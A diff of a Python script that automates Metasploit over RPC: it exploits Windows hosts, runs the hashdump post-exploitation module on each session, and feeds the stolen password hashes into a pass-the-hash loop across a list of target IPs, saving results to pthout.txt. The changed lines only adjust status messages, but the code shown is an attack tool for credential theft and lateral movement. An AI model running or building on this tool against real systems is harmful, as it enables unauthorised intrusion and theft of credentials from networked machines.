@@ -143,12 +143,12 @@ def runExploit(client, exploit, payload, timeout):
         count += 1
     if count >= timeout:
         return None
-    print('Time taken: ' + str(count))
     # Get the shell and run the hashdump
     shell = client.sessions.session(jobId)
     if shell == None:
         return None
     shell.runsingle('run post/windows/gather/hashdump')
+    print('Successfully accessed ' + str(exploit['RHOST']) + ' - dumping hashes...')
     while(True):
         output = shell.read()
         if(':::' in output):
@@ -212,7 +212,7 @@ def main():
         for i in range(len(targets)):
             hashData = passTheHash(targets[i].get('ip'), args['localIp'], hashes, client)
             if hashData != None:
-                print('Adding ' + str(len(hashData[1])) + ' to the hash list')
+                print('Adding ' + str(len(hashData[1])) + ' to the hash list from ' + hashData[0])
                 mergeList(hashes, hashData[1])
                 successes.append(hashData)
         print('Writing hashes to pthout.txt...')
